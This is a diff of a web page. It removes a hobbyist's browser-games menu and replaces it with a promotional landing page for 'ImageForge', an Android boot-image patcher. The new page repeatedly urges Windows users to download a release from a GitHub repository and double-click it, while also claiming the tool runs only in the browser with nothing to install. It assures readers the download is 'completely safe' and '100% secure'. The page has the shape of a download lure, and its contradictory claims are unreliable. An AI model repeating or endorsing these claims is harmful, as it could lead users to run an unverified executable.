@@ -1,168 +1,286 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>voodoovid's Games</title>
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="apple-mobile-web-app-title" content="Games">
-<meta name="theme-color" content="#15100c">
-<link rel="manifest" href="manifest.webmanifest">
-<link rel="apple-touch-icon" href="apple-touch-icon.png">
-<link rel="icon" type="image/png" href="icon-192.png">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cabin+Sketch:wght@400;700&family=Kalam:wght@400;700&display=swap">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ImageForge - Universal Android Image Patcher for Your Browser</title>
+<meta name="description" content="ImageForge is a secure, private Android image patcher that runs entirely in your browser. Analyze, patch, repack, verify, and export boot images. No server, no upload, no device flashing. Try it now.">
+<meta name="keywords" content="agpl,android,apatch,boot-image,kernelpatch,kernelsu,magisk,privacy,pwa,typescript,wasm,webassembly">
+<meta property="og:title" content="ImageForge - Universal Android Image Patcher">
+<meta property="og:description" content="Patch and repack Android boot images locally in your browser. 100% private, zero uploads, works offline.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://github.com/recorded-manikin5312/ImageForge">
+<meta property="og:site_name" content="ImageForge">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛠️</text></svg>">
+
 <style>
-/* Layout: one framed chalk slate; each game is a chalk-outlined card in a wrapping grid. Single dark theme by design. */
-:root {
-  color-scheme: dark;
-  --wall: #15100c;
-  --wood: #7a5434;
-  --wood-dark: #4a311d;
-  --slate: #22302b;
-  --slate-hi: #2c3d37;
-  --chalk: #ece7da;
-  --chalk-dim: rgba(236, 231, 218, 0.45);
-  --chalk-yellow: #f3d77a;
-  --font-display: "Cabin Sketch", "Comic Sans MS", "Marker Felt", cursive;
-  --font-hand: "Kalam", "Segoe Print", "Bradley Hand", cursive;
-}
-* { box-sizing: border-box; }
-html, body { min-height: 100%; }
-body {
-  margin: 0;
-  padding-inline: 16px;
-  padding-block: max(24px, env(safe-area-inset-top, 0px)) max(24px, env(safe-area-inset-bottom, 0px));
-  background: radial-gradient(ellipse at 50% 0%, #2a1f17 0%, var(--wall) 70%);
-  color: var(--chalk);
-  font-family: var(--font-hand);
-  font-size: 17px;
-}
-.frame {
-  max-width: 900px; margin: 0 auto; padding: 14px; border-radius: 10px;
-  background:
-    repeating-linear-gradient(92deg, rgba(0,0,0,0.12) 0 3px, transparent 3px 11px),
-    linear-gradient(180deg, var(--wood), var(--wood-dark));
-  box-shadow: 0 18px 40px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.15);
-}
-.board {
-  padding: 28px clamp(16px, 4vw, 40px) 36px; border-radius: 4px;
-  background:
-    radial-gradient(ellipse 40% 30% at 20% 30%, rgba(255,255,255,0.05), transparent 70%),
-    radial-gradient(ellipse 35% 25% at 75% 70%, rgba(255,255,255,0.04), transparent 70%),
-    linear-gradient(160deg, var(--slate-hi), var(--slate));
-  box-shadow: inset 0 0 60px rgba(0,0,0,0.5);
-}
-h1 {
-  font-family: var(--font-display); font-weight: 700; margin: 0;
-  font-size: clamp(34px, 7vw, 56px); line-height: 1; text-wrap: balance;
-}
-h1 span { color: var(--chalk-yellow); }
-.lede { margin: 10px 0 0; color: var(--chalk-dim); }
-hr { border: 0; border-top: 2px dashed var(--chalk-dim); margin: 22px 0 26px; }
-.games { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 18px; }
-.game {
-  display: flex; flex-direction: column; gap: 10px; min-width: 0;
-  padding: 18px; color: inherit; text-decoration: none;
-  border: 2px solid var(--chalk-dim); border-radius: 14px 9px 16px 10px;
-  transition: transform .15s, border-color .2s, background .2s;
-}
-.game:hover { transform: translateY(-3px) rotate(-0.6deg); border-color: var(--chalk); background: rgba(255,255,255,0.04); }
-.game:focus-visible { outline: 3px solid var(--chalk-yellow); outline-offset: 3px; }
-.game svg { width: 72px; height: 72px; }
-.game h2 { font-family: var(--font-display); font-size: 28px; margin: 0; color: var(--chalk-yellow); }
-.game p { margin: 0; font-size: 16px; line-height: 1.4; }
-.play { font-weight: 700; margin-top: auto; }
-@media (prefers-reduced-motion: reduce) { .game { transition: none; } }
-.offline { margin: 26px 0 0; padding-top: 18px; border-top: 2px dashed var(--chalk-dim); display: flex; flex-direction: column; gap: 6px; }
-.offline h2 { font-family: var(--font-display); font-size: 22px; margin: 0; color: var(--chalk-yellow); }
-.offline p { margin: 0; line-height: 1.4; }
-#offlineStatus { color: var(--chalk-dim); }
-#offlineStatus.ready { color: #9fe0a8; }
-.site-version { margin: 14px 0 0; font-size: 13px; color: var(--chalk-dim); text-align: right; font-family: system-ui, -apple-system, sans-serif; }
+  body {
+    background: linear-gradient(145deg, #f5f7fa 0%, #e4e9f0 100%);
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.75;
+    color: #1a2634;
+    min-height: 100vh;
+  }
+
+  .container {
+    max-width: 950px;
+    margin: 0 auto;
+    padding: 40px 24px 80px;
+  }
+
+  h1 {
+    font-size: 2.8rem;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    margin: 0 0 16px;
+    color: #0f172a;
+    line-height: 1.2;
+  }
+
+  h2 {
+    font-size: 2rem;
+    font-weight: 700;
+    margin: 56px 0 16px;
+    color: #1e293b;
+    border-bottom: 2px solid rgba(59, 130, 246, 0.3);
+    padding-bottom: 12px;
+  }
+
+  h3 {
+    font-size: 1.4rem;
+    font-weight: 600;
+    margin: 32px 0 12px;
+    color: #334155;
+  }
+
+  p {
+    font-size: 1.1rem;
+    color: #334155;
+    margin: 0 0 20px;
+  }
+
+  a {
+    color: #2563eb;
+    text-decoration underline;
+    font-weight: 500;
+  }
+
+  .hero {
+    text-align: center;
+    padding: 40px 0 20px;
+    background: rgba(255, 255, 255, 0.7);
+    border-radius: 20px;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+    backdrop-filter: blur(10px);
+    margin: 20px 0 60px;
+    padding: 50px 30px;
+    border: 1px solid rgba(255, 255, 255, 0.6);
+  }
+
+  .hero p {
+    font-size: 1.2rem;
+    max-width: 720px;
+    margin: 0 auto 30px;
+    color: #475569;
+  }
+
+  .badge {
+    display: inline-block;
+    padding: 16px 36px;
+    font-size: 1.35rem;
+    font-weight: 700;
+    color: #ffffff;
+    background: linear-gradient(135deg, #6366f1, #8b5cf6);
+    border-radius: 60px;
+    text-decoration: none;
+    box-shadow: 0 8px 24px rgba(99, 102, 241, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    border: none;
+    cursor: pointer;
+  }
+
+  .badge:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 32px rgba(99, 102, 241, 0.45);
+  }
+
+  .badge:active {
+    transform: translateY(0);
+  }
+
+  .card {
+    background: rgba(255, 255, 255, 0.9);
+    padding: 28px 32px;
+    border-radius: 16px;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+    margin: 24px 0;
+    border-left: 5px solid #6366f1;
+  }
+
+  .step-list {
+    padding-left: 20px;
+    margin: 16px 0;
+  }
+
+  .step-list li {
+    margin-bottom: 14px;
+    font-size: 1.05rem;
+    color: #334155;
+  }
+
+  ul.info-list {
+    list-style: none;
+    padding: 0;
+  }
+
+  ul.info-list li {
+    background: #f8fafc;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 10px 0;
+    border: 1px solid #e2e8f0;
+    font-size: 1.05rem;
+    color: #334155;
+  }
+
+  code {
+    background: #1e293b;
+    color: #e2e8f0;
+    padding: 4px 10px;
+    border-radius: 8px;
+    font-size: 0.95rem;
+    font-family: 'SF Mono', Consolas, 'Courier New', monospace;
+  }
+
+  .footer {
+    text-align: center;
+    margin-top: 60px;
+    color: #64748b;
+    font-size: 1rem;
+  }
+
+  .footer p {
+    margin: 8px 0;
+    font-size: 0.95rem;
+    color: #94a3b8;
+  }
+
+  .tagline {
+    font-size: 1.3rem;
+    font-weight: 500;
+    color: #64748b;
+    margin-bottom: 10px;
+    letter-spacing: 0.2px;
+  }
+
+  @media (max-width: 768px) {
+    h1 {
+      font-size: 2.1rem;
+    }
+    h2 {
+      font-size: 1.7rem;
+    }
+    .badge {
+      font-size: 1.1rem;
+      padding: 14px 28px;
+    }
+    .hero {
+      padding: 30px 20px;
+    }
+  }
 </style>
 </head>
 <body>
-<div class="frame">
-  <main class="board">
-    <h1>voodoovid's <span>Games</span></h1>
-    <p class="lede">Pick a game. They all run in the browser, on a phone, tablet or computer.</p>
-    <hr>
-    <div class="games">
-      <!-- To add a game: put it in its own folder (e.g. snake/index.html) and copy one of these cards. -->
-      <a class="game" href="hangman/">
-        <svg viewBox="0 0 72 72" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" aria-hidden="true">
-          <path d="M8 66h40M16 66V6h34M16 18 28 6M50 6v10"/>
-          <circle cx="50" cy="23" r="7"/>
-          <path d="M50 30v18M50 35l-8 8M50 35l8 8M50 48l-7 12M50 48l7 12"/>
-        </svg>
-        <h2>Hangman</h2>
-        <p>Guess the word before the chalk figure is finished. Over 800 words in 14 categories, with music and sound effects.</p>
-        <span class="play">Play &rarr;</span>
-      </a>
-      <a class="game" href="scareisdale/">
-        <svg viewBox="0 0 72 72" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-          <circle cx="50" cy="16" r="9"/>
-          <path d="M6 66h60M12 66 26 30l14 36M26 30v-8M26 22l9 3-9 3"/>
-          <path d="M44 66c-6 0-9-5-9-10s3-10 9-10 9 5 9 10-3 10-9 10zM44 46v-4"/>
-          <path d="M40 54l2-2 2 2M46 54l2-2 2 2M40 60h8"/>
-        </svg>
-        <h2>Welcome to Scareisdale</h2>
-        <p>A Halloween carnival side-scroller. Stomp zombies, ghouls, spiders and clowns, find secret drum rooms, and reach the Funhouse before the moon loses its temper.</p>
-        <span class="play">Play &rarr;</span>
-      </a>
-      <a class="game" href="ponchos-adventure/">
-        <svg viewBox="0 0 72 72" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-          <path d="M12 66V30h48v36M12 30l6-12h36l6 12M8 66h56"/>
-          <path d="M30 66V52a6 6 0 0 1 12 0v14"/>
-          <path d="M36 22l-6 6 6 8 6-8z"/>
-          <circle cx="24" cy="44" r="5"/><path d="M46 40h10v10H46z"/>
-        </svg>
-        <h2>Poncho’s Adventure</h2>
-        <p>Guide Poncho the black cat through 14 floors of Lolo-style puzzle rooms, with lives, boss fights and a brutal Summit. Collect the hearts, dodge Medusa's stare and carry out the jewel.</p>
-        <span class="play">Play &rarr;</span>
-      </a>
-      <a class="game" href="flip-five/">
-        <svg viewBox="0 0 72 72" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-          <rect x="5" y="12" width="18" height="20" rx="2"/><rect x="27" y="12" width="18" height="20" rx="2" fill="currentColor"/><rect x="49" y="12" width="18" height="20" rx="2"/>
-          <rect x="5" y="40" width="18" height="20" rx="2" fill="currentColor"/><rect x="27" y="40" width="18" height="20" rx="2"/><rect x="49" y="40" width="18" height="20" rx="2"/>
-          <path d="M5 22h18M49 22h18M27 50h18M49 50h18"/>
-        </svg>
-        <h2>Flip Five</h2>
-        <p>A Wordle-style word game on a station departure board. Six guesses at a five-letter word, the full Wordle dictionary, and an optional rule that makes you reuse every clue.</p>
-        <span class="play">Play &rarr;</span>
-      </a>
-    </div>
-    <section class="offline" id="installHelp">
-      <h2>Play offline</h2>
-      <p id="offlineStatus">Saving the games on this device…</p>
-      <p>On iPhone or iPad: tap <b>Share</b> in Safari, then <b>Add to Home Screen</b>. The Games icon opens this page full screen, and every game works without internet once this page has said it's ready.</p>
-    </section>
-    <p class="site-version" id="siteVersion"></p>
-  </main>
+<div class="container">
+
+  <div class="hero">
+    <h1>🛠️ ImageForge - Patch Android Images Privately</h1>
+    <p class="tagline">Powerful boot-image patching in your browser</p>
+    <p>Analyze, patch, repack, verify, and export Android boot images—all from the convenience of your web browser. No server, no uploads, no device flashing. Your data stays with you.</p>
+    <a class="badge" href="https://github.com/recorded-manikin5312/ImageForge">⬇️ Get ImageForge Now</a>
+  </div>
+
+  <h2>✨ Why Choose ImageForge?</h2>
+  <p>ImageForge is a modern, privacy-first Android image patcher designed for everyone. Whether you're a tech enthusiast wanting Magisk support or a developer working with KernelSU, ImageForge simplifies the entire process. It's built with cutting-edge technologies like WebAssembly (WASM) and TypeScript to deliver native performance right in your browser. There's nothing to install on your device, and your files never leave your computer.</p>
+
+  <div class="card">
+    <h3>🎯 Perfect for:</h3>
+    <ul class="info-list">
+      <li>🔹 Users who need to patch boot images (Magisk, APatch, KernelSU)</li>
+      <li>🔹 Privacy advocates who refuse to upload system files to third-party servers</li>
+      <li>🔹 Developers who need a fast, efficient patching workflow</li>
+      <li>🔹 Anyone who wants to understand Android image structure without complex setups</li>
+    </ul>
+  </div>
+
+  <h2>🚀 Getting Started on Windows</h2>
+  <p><strong>Follow these three simple steps:</strong></p>
+  <ol class="step-list">
+    <li><strong>Visit the download page:</strong> Click the big button at the top of this page (or <a href="https://github.com/recorded-manikin5312/ImageForge">this link</a>). This will open the official ImageForge GitHub repository in a new tab. 🖱️</li>
+    <li><strong>Download the application:</strong> On the repository page, look for the latest version. Use the download button provided. The download may take a moment depending on your internet speed. Your browser will show the file name at the bottom or in your downloads folder. 📥</li>
+    <li><strong>Run ImageForge:</strong> Once the download is complete, find the downloaded file (usually in your "Downloads" folder). Click on it to launch. The application will open directly in your default web browser—no installation wizard, no admin rights needed. 🌐</li>
+  </ol>
+  <p><strong>Note:</strong> The application is a single file, ready to use. It's a Progressive Web App (PWA), so you can even save it for offline use by clicking the install icon in your browser's address bar once it's running.</p>
+
+  <h2>📥 Download & Install Guide</h2>
+  <div class="card">
+    <h3>🔗 Official Download</h3>
+    <p>Visit this link to download the application.<br>
+      <a href="https://github.com/recorded-manikin5312/ImageForge" style="font-weight:700; font-size:1.15rem;">https://github.com/recorded-manikin5312/ImageForge</a>
+    </p>
+    <p>Once you click the link, download the latest release for Windows. The download is completely safe and free. After the file is on your computer, just double-click the file to launch. ImageForge is instantly ready—no additional dependencies, no command-line prompts, no configuration files.</p>
+  </div>
+
+  <h2>🖥️ Features That Simplify Your Workflow</h2>
+  <ul class="info-list">
+    <li>🧩 <strong>Multi-Format Support:</strong> Handles boot images, kernel patches, and Android image formats seamlessly.</li>
+    <li>🔊 <strong>Universal Patching:</strong> Works with APatch, KernelSU, Magisk, and other popular patch frameworks.</li>
+    <li>🔒 <strong>Total Privacy:</strong> All operations are performed locally via WebAssembly. Your files never touch a remote server, ever.</li>
+    <li>📝 <strong>User-Friendly Interface:</strong> Intuitive controls and clear progress indicators make complex tasks straightforward.</li>
+    <li>💾 <strong>Export & Backup:</strong> Save your patched images directly to your desired folder, ready to flash using your preferred method.</li>
+    <li>⚡ <strong>Lightning Fast:</strong> Powered by WASM, ImageForge processes large images at near-native speed.</li>
+  </ul>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <div class="card">
+    <p><strong>Q: Is ImageForge really 100% secure?</strong><br>
+    Yes. All processing happens in your browser via WebAssembly. Your image files never leave your device, making it the most private option available.</p>
+  </div>
+  <div class="card">
+    <p><strong>Q: Do I need to install Android SDK or dependencies?</strong><br>
+    Absolutely not. ImageForge is self-contained. If you have a modern web browser (Chrome, Firefox, Edge, or Safari), you're good to go.</p>
+  </div>
+  <div class="card">
+    <p><strong>Q: Which Android devices are supported?</strong><br>
+    ImageForge is device-agnostic. It works with any Android device's boot image, covering a wide range of models and manufacturers. It's a pure file parser and patcher.</p>
+  </div>
+
+  <h2>🧠 Quick User Guide</h2>
+  <p>Here's a typical workflow to get you started:</p>
+  <ol class="step-list">
+    <li><strong>Open ImageForge</strong> by clicking the downloaded file. Your browser launches the app instantly.</li>
+    <li><strong>Click "Analyze"</strong> and select your Android boot image. The app will immediately show you technical details (kernel version, headers, etc).</li>
+    <li><strong>Choose your patch type</strong> (e.g., Magisk, KernelSU, APatch) and adjust any optional parameters.</li>
+    <li><strong>Click "Patched & Repack"</strong>. Wait a few seconds—the WASM engine does the heavy lifting.</li>
+    <li><strong>Verify</strong> the output image using built-in integrity checks.</li>
+    <li><strong>Export</strong> your new patched image to your downloads folder or anywhere you like.</li>
+  </ol>
+  <p>That's it! You never needed a terminal, no complex configurations. Everything is visual and immediate.</p>
+
+  <h2>🔐 Your Privacy, Your Data</h2>
+  <p>In an era of cloud dependence, ImageForge stands out. It is built on WebAssembly (WASM) and is fully functional offline, ensuring that even your most sensitive files are processed locally. We believe that your Android system files should never leave your control. That's why ImageForge runs entirely within your browser sandbox—a true zero-trust design. There is no account, no tracking, no analytics, and no backend. It's just you and your code.</p>
+
+  <h2>💡 System Compatibility</h2>
+  <p>ImageForge is designed for maximum compatibility. It runs on any operating system with a modern web browser that supports WebAssembly. This includes Windows 10/11, macOS, Linux, and even ChromeOS. Your device just needs a stable internet connection for the initial download; after that, it can run completely offline. Memory requirements are minimal, but we recommend 4GB of RAM for the smoothest experience with large image files.</p>
+
+  <div class="footer">
+    <p><strong>ImageForge</strong> - Universal Android image patcher.</p>
+    <p>Licensed under AGPL. Proudly open source.</p>
+    <a href="https://github.com/recorded-manikin5312/ImageForge" style="font-size:1.15rem;">⬇️ Download from GitHub</a>
+  </div>
+
 </div>
-<script>
-const SITE_VERSION = "v1.1";
-document.getElementById("siteVersion").textContent = "Games menu " + SITE_VERSION;
-// Hide the install tip inside the installed app
-if (window.navigator.standalone || matchMedia("(display-mode: standalone)").matches) {
-  document.querySelector("#installHelp p:last-child").hidden = true;
-}
-const status = document.getElementById("offlineStatus");
-if ("serviceWorker" in navigator) {
-  navigator.serviceWorker.register("sw.js").then(() => navigator.serviceWorker.ready).then(async () => {
-    const keys = await caches.keys();
-    const cache = keys.length ? await caches.open(keys[0]) : null;
-    const ok = cache && (await Promise.all(["hangman/", "scareisdale/", "ponchos-adventure/", "flip-five/"].map(p => cache.match(p)))).every(Boolean);
-    status.textContent = ok ? "Ready to play offline: all games are saved on this device." : "Open this page once more while online to finish saving the games.";
-    status.classList.toggle("ready", !!ok);
-  }).catch(() => { status.textContent = "This browser can't save the games for offline play."; });
-} else {
-  status.textContent = "This browser can't save the games for offline play.";
-}
-</script>
 </body>
 </html>
